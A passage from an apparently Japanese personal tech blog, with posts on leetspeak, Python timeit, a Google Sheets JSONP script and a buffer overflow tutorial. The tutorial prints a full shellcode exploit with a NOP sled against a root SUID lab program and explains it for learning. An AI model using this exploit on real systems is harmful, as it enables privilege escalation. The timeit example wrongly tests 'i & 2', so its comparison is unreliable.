<li>K    : |&lt;</li>
<li>L     : l, |</li>
<li>M   : |\/|</li>
<li>N    : |\|</li>
<li>O    :  0</li>
<li>P     : ?</li>
<li>Q    : K</li>
<li>R    : |2, 12</li>
<li>S     :  5, $</li>
<li>T     : 7</li>
<li>U    : ?</li>
<li>V    : <span style="font-family: Arial, Helvetica, sans-serif;">\/</span></li>
<li>W   : \/\/</li>
<li>X    : >&lt;</li>
<li>Y    : 9</li>
<li>Z    : 2</li>
</ul>


<p>&nbsp;</p>

<p>単語に対応するleetspeak</p>

<ul>
<li><span style="line-height: 13px;">for　: 4</span></li>
<li>be     : b</li>
<li>you   : u</li>
<li>to      : 2</li>
<li>too   : 2</li>
<li>are    : r</li>
<li>easy  : ez</li>
<li>see    : c</li>
<li>own   : pwn</li>
<li>noob : n00b</li>
<li>rocks  : rox</li>
<li>sucks  : sux</li>
<li>cool    : kewl</li>
<li>any     : ne</li>
<li>anyone : ne1</li>
<li>wait     :w8</li>
<li>later    :;8r</li>
</ul>


<p>頻出するleetspeakはこんな感じみたいです。覚えなくても大丈夫だと思います。こんなのがあるんだな、程度のメモです。よく使われるLUV( = loveの意味)とか U and I とか、日本でも自然と使われているものもありますね。（leetspeakとは違うかもしれませんが）</p>

<p>&nbsp;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/04/14/wordpress31/">Pythonによる関数の実行時間測定[timeitモジュール]</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-04-14T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>奇数判定の処理を書く時って、n % 2 == 0で書いてたんですが、とあるサンプルコードで n &amp; 1 == 0で書かれていたコードがあって、やっぱりbit演算のほうが、処理速いのかなー、と思い、pythonで実行速度を計測してみました。</p>

<p>そのときに使ったtimeitモジュールのメモ。</p>

<p>datetime.clockの差分を取るものが、サンプルでは多いのですが、関数単位で処理時間取りたいときは、pythonが標準で提供しているtimeitモジュールを利用するのが良さそうです。</p>

<p>&nbsp;</p>

<p>その時のコード。以下が測定対象のモジュール(ファイル名 evencheck.py)</p>

<pre class="lang:python decode:true" title="evencheck.py"># coding: utf-8

def is_even1():
    even = 0
    for i in range(100000):
        if i % 2 == 0:
            even += 1

def is_even2():
    even = 0
    for i in range(100000):
        if i & 2 == 0:
            even += 1</pre>


<p>10万までの整数を偶数か判定する、だけ（出力もない）の関数を２パターン、余剰計算とbit演算するパターンで作成しました。</p>

<p>ここにある、関数２つの処理速度を計測するためのモジュールを別途書きます</p>

<pre class="lang:default decode:true">import timeit
def main():
    print("main")

    print("start is_even1()")
    t = timeit.Timer("evencheck.is_even1()", "import evencheck")
    print t.timeit(100)

    print("start is_even2()")
    t = timeit.Timer("evencheck.is_even2()", "import evencheck")
    print t.timeit(100)

if __name__ == '__main__':
    main()</pre>


<p>ポイントはtimeitモジュールをインポートすること。</p>

<p>インスタンス生成時の引数は</p>

<p>第一引数が 関数実行する際のコード（引数がある関数もここで指定できます）</p>

<p>第二引数が第一引数を実行するためのインポート文（最初に書いたコードをインポートすればOK）</p>

<p>&nbsp;</p>

<p>実際にテストしている部分は t.timeit()の箇所になります。ここは引数を渡せば、その回数だけ、渡さなければ100万回実行した時間を計測します。</p>

<p>テスト実行時に関数単位で処理時間をテストしたいときなんかはこれを使うといいかもしれませんね。</p>

<p><a href="http://docs.python.jp/2/library/timeit.html">公式リファレンス</a></p>

<p>&nbsp;</p>

<p>ちなみに、当然かもしれませんが、測定結果はbit演算で奇数判定したほうが、若干速いです。(1万回実行しても、本当にわずかな差)</p>

<p>&nbsp;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/04/11/wordpress30/">Googleスプレッドシートで簡単JSONP Api</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-04-11T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>最近はMacユーザも増え(僕も去年の15inch retinaで初めて)たり、プリインストールでofficeが入ってないwindowsも増えたせいか、仕事でも学校でもgoogle driveでドキュメント作成することが増えました。</p>

<p>それらのシートを情報テーブルとして、リアルタイムに編集できたり、取得できたらいいなーと思って調べたらありました。（というよりやらなきゃいけなくなったので、調べてたら、とりあえず出来た）</p>

<p>昔から利用されているExcelのシートとかを、googleスプレッドシートに移植して、WEB経由でアクセスしたり、用途は色々ありそうです。便利です。</p>

<p>つまり、googleスプレッドシート内の情報をJSONP形式で出力するAPI（というと大げさだけど）にしてみます。取得はjqueryのajax関数(datatype:&#8217;jsonp&#8217;)とかで。別にajaxで取得したいわけじゃなければjsonpじゃなくて、txtやcsv出力なら、プログラムを書かずに実現できます。今回書いたのはjsonpでajaxで取得するためのスクリプトです。</p>

<p>スプレッドシートを作成し、メニューから[tool] &ndash;> [script editor]でスクリプトを新規作成・登録できます。</p>

<pre class="lang:js decode:true">var spreadsheetId = 'スプレッドシートID';
var sheetName = 'シートの名前'; 

function doGet(req) {
    var response = { status: { code: "100", message: "" } };
    if (req == undefined) {
        response.members = getUserInfo(undefined);
    } 

    if (response.members.length == 0) {
        response.status.message = "Warning: Members not found.";
    }

    return ContentService.createTextOutput(
      req.parameters.callback + '(' + JSON.stringify(response) + ')' )
      .setMimeType(ContentService.MimeType.JSON);
}

function getUserInfo(value) {

    var sheet = SpreadsheetApp.openById(spreadsheetId).getSheetByName(sheetName);
    var list = sheet.getRange(1, 1, sheet.getLastRow(), sheet.getLastColumn()).getValues();

    var data = new Array();

    if (value == undefined) {
        for(var i=0; i&lt;list.length; i++){
            var row = Object();
            row.id = list[i][0]; //ID
            row.name = list[i][1]; //氏名
            row.mail = list[i][2]; //mail
            data.push(row);
        }
        return data;
    }
}</pre>


<p>&nbsp;</p>

<p>本当は取得する列も行もparameterで色々指定するように書いてたんですが、ブログ用にできるだけシンプルにしました。 ユーザ一覧みたいな情報が格納されているテーブルから、IDと名前とアドレスを取得して、ユーザ一覧情報をjson形式にしてreturnしています。</p>

<p>ここでポイントはjsonpに対応するためにcallback用のパラメータをreturnする文字列の中に含める、ということです。これがないと正常に取得できませんでした。(req.parameters.callback)のところです。</p>

<p>任意のスクリプトを書いて保存した後は、[Deploy as web app]をクリック。アクセス用のURLを発行します。</p>

<p>それができたら今度は自分のアプリケーションからajax経由で先ほどのURLからJSONをダウンロードしてきます。</p>

<pre class="lang:default decode:true">$.ajax({
    type: 'GET',
    url: 'さっき取得したURL',
    datatype: 'jsonp',
    jsonp: 'callback'
}).done(function(response){
    //取得したデータを使って色々する
    console.dir(response);
});</pre>


<p>これでOK。responceにjsonはいってるんで、好きにいじくる。僕が使ったシチュエーションだとangularJS使ってたんで、モデルに取得したjsonつっこむだけでオブジェクトがたっぷり！みたいな嬉しい感じでした。</p>

<p>これしかない！！っていうときは少ないと思いますが、既存のスプレッドシートにデータがたくさんあるなら、ざっくりこういうのが書ければ便利かなー、と思います。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
  
    
      <h1 class="entry-title"><a href="/blog/2013/04/10/wordpress29/">簡単なバッファオーバーフローを再現してみる（３）</a></h1>
      
      
    
      <p class="meta">
        








  


<time datetime="2013-04-10T00:00:00+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>かなり間が空いてしまいましたが、<a href="http://tamago.servehttp.com/blog/?p=190">前回</a>に引き続きバッファオーバーフロー再現していきたいと思います。自分の復習用のメモです。</p>

<p><a href="http://www.amazon.co.jp/Hacking-%E7%BE%8E%E3%81%97%E3%81%8D%E7%AD%96%E8%AC%80-%E2%80%95%E8%84%86%E5%BC%B1%E6%80%A7%E6%94%BB%E6%92%83%E3%81%AE%E7%90%86%E8%AB%96%E3%81%A8%E5%AE%9F%E9%9A%9B-Jon-Erickson/dp/4873115140">こちらの参考書</a>の内容を読み、参考にして記事を書いています。より詳しく知りたい方は参考書を読んでいただければと思います。</p>

<p>前回、スタッグセグメントの戻りアドレス値をBOFにより上書きして、強制的に当該アドレスの処理を実行させる手法でしたが、今回は任意のコードを挿入し、それを実行させる手法です。</p>

<p>ちょっと用意するべきプログラムが多いので、今回は実際に再現するよりも、攻撃プログラムが書かれた箇所のみを解説していきます。プログラム中にある、「./notesearch」はroot権限のSUIDが設定されたBOFの脆弱性があるプログラム、ということだけ、ここでは確認できればOKです。（そちらも併せて詳しく、という方は書籍を読んでみていただければ、と思います。）</p>

<p>参考コード</p>

<pre class="lang:default decode:true">#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;string.h&gt; 
char shellcode[]= "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89" 
"\xe1\xcd\x80";

int main(int argc, char *argv[]) { 
   unsigned int i, *ptr, ret, offset=270; 
   char *command, *buffer;

   command = (char *) malloc(200); 
   bzero(command, 200);

   strcpy(command, "./notesearch \'"); 
   buffer = command + strlen(command); 

   if(argc &gt; 1) 
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; 

   for(i=0; i &lt; 160; i+=4) 
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60);
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

   strcat(command, "\'");

   system(command);
   free(command);
}</pre>


<p>main()から順番に解読していこうと思います。</p>

<p>まずは</p>

<p>12 行目command = (char *)malloc(200)ですが、200byteをヒープメモリに確保しchar型ポインタを返します。この際、確保された領域はゼロクリアされませんので、次のbzero(command, 200)でメモリ領域をゼロで初期化します。<a href="http://www9.plala.or.jp/sgwr-t/lib/malloc.html">[malloc]参考URL</a> <a href="http://temping-amagramer.blogspot.jp/2010/11/cbzero.html">[bzero]参考URL</a></p>

<p>次の15行目 strcpy(command, &#8220;./notesearch &amp;#8217; &#8220;);は、commandに&#8221;./notesearch &amp;#8217; &#8220;をコピーするだけ、その次のbuffer = command + strlen(command)は、最初ちょっとわかりづらかったので、以下のサンプル書きました。</p>

<pre class="lang:default decode:true">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(){
    char *command, *buffer;

    command = (char *)malloc(200);
    bzero(command, 200);

    strcpy(command, "./notesearch \'");
    buffer = command + strlen(command);
    printf("hoge:%p\n", buffer);
    printf("hoge:%p\n", command);
}</pre>


<p>先ほどの部分を抜き出して、変数の値を出力するだけですね。commandとbufferはchar型のポインタなので、ポインタが指すアドレスを出力させています。</p>

<p>実行すればわかるとおもいますが、commnadのポインタが指すアドレスから&#8221; ./notesearch &amp;#8217; &#8220;の文字列の分、ポインタを進めたアドレスがbufferに格納されています。（command + 14byte ）</p>

<p>次のif文とoffsetへの代入は、引数を与えたときのみ、今は解説省略します。</p>

<p>次のret = (unsigned int) &amp;i &#8211; offsetでは、iのアドレスからmain関数開始時に宣言されたoffset文引いたアドレスを戻りアドレスとしてretに格納しておきます。</p>

<p>その後のfor文では4byteずつ40回（160byte分）、先ほど設定した戻りアドレスretをbufferの中に繰り返し埋めていきます。(buffer開始から160byte全てがretで設定された戻りアドレスの状態)</p>

<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.00.png" rel="image_group"><img class="alignnone size-full wp-image-325" alt="Screen Shot 2013-04-10 at 0.32.00" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.00.png?resize=539%2C185" data-recalc-dims="1" /></a></p>

<p>その後memset()でbufferから60byte分、0&#215;90を上書きしていきます。(0&#215;90の意味はコードの解説が終わったらまとめて)(buffer開始から60byteは0&#215;90、以降61byteから160byteまでは戻りアドレスの状態)</p>

<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.20.png" rel="image_group"><img class="alignnone size-full wp-image-326" alt="Screen Shot 2013-04-10 at 0.32.20" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.20.png?resize=551%2C192" data-recalc-dims="1" /></a></p>

<p>そしてmemcpy()でbufferから60byte後ろに、グローバル変数として宣言されているshellcode[]を更に上書きします。(buffer開始から60byteは0&#215;90、61byteからsizeof(shellcode)-1はグローバル変数shellcode、そして以降は戻りアドレス、の状態)<a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.40.png" rel="image_group"><img class="alignnone size-full wp-image-327" alt="Screen Shot 2013-04-10 at 0.32.40" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.32.40.png?resize=536%2C190" data-recalc-dims="1" /></a></p>

<p>最後にstrcat()でcommandの末尾にシングルクォーテーションを追加します。ここで注意するのは、文字列は先頭アドレスからnullまで、なので、commandのすぐ後ろから開始されているbufferもこの場合commandに含まれます。つまり</p>

<p>commandの内容： &#8220;./notesearch &amp;#8217; &#8221; [bufferの内容] &#8220;&amp;#8217; &#8220;となっています。</p>

<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.50.38.png" rel="image_group"><img class="alignnone size-full wp-image-328" alt="Screen Shot 2013-04-10 at 0.50.38" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/04/Screen-Shot-2013-04-10-at-0.50.38.png?resize=709%2C50" data-recalc-dims="1" /></a>文字化けしてますが、上記の内容と一致していることがわかると思います。</p>

<p>そして、system()関数でcommandに格納されている文字列をOSコマンドとして実行することで攻撃を実行します。</p>

<p>ここで0&#215;90という数字を繰り返しメモリに書き込んでいますが、これはx86アーキテクチャにおけるnop命令(0&#215;90)の連続です（NOP(No OPerationの略)スレッドと呼ばれる）</p>

<p>これは、何もせずに次の処理に進めるだけの命令ですが、これを繰り返しメモリに書き込むことで戻りアドレスが、NOPスレッド内のアドレスであれば、どこでもシェルコードまで自動的に滑っていきます。これによって、シェルコードを実行させやすくしているようです。</p>

<p>ただ、この攻撃手法の難しいところが、notesearchでBOFを発生させる際の戻りアドレスをある程度試行錯誤しなくてはならない、ということです。</p>

<p>main()関数内で一番最初の変数iがスタックフレームにpushされたときのアドレスを参考値として、そこから変数offset（初期値270）を減じた値を戻りアドレスとしていますね。</p>

<p>引数によって、offsetを調整できるように、 引数チェックのif文の箇所の処理があります。</p>

<p>ここで設定する戻りアドレスを、notesearchでBOFさせたときにNOPスレッド内のアドレスの範囲内にできれば、シェルコードが実行される、という仕組みですね。</p>

<p>変数shellcodeの中に書かれている16進数の文字列は、シェル起動の命令が書かれたものです。これの説明はまた改めます。（これを実行するとシェルが起動する、ということだけ今は確認できればと思います。）</p>

<p>&nbsp;</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/6/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/blog/page/4/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2013/12/08/octopressniyi-xing-sitemimasita/">Octopressに移行してみました</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/28/wordpress77/">簡易プロセス死活監視プログラムをc#で</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/25/wordpress76/">xv6のソースコードとテキストを読んでみる1_chapter0_2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/19/wordpress75/">[CSCamp CTF]解けなかった問題forensics1のwriteupを読んでみた</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/18/wordpress74/">Vagrant + Chef solo + Berkshelfを試してみたのでまとめ</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 -  Kenta Komai <br/>
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> + <a href="https://github.com/ioveracker/mnml">mnml</a>.
	  
  </span>
</p>

</footer>
  



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>





  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
